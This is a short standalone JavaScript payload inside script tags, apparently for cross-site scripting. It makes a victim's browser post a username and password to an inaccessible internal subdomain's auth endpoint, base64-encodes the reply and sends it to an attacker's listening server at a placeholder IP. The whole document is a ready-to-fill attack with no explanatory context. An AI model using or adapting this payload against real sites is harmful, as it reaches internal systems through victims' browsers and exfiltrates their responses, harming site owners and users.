
<script>
var xmlHttp = new XMLHttpRequest();
xmlHttp.onreadystatechange = function() {
    if(xmlHttp.readyState == XMLHttpRequest.DONE) {
        // send the response to our listening server
        var r2 = new XMLHttpRequest();
        var rsp = btoa(encodeURIComponent(xmlHttp.responseText));
        r2.open("POST", "http://<ip>/", false);
        r2.send(rsp);
    }
};
xmlHttp.open("POST", "http://<inaccessible-subdomain>.<victim-domain>/auth-endpoint", false);
xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlHttp.send("username=username&password=password");
</script>

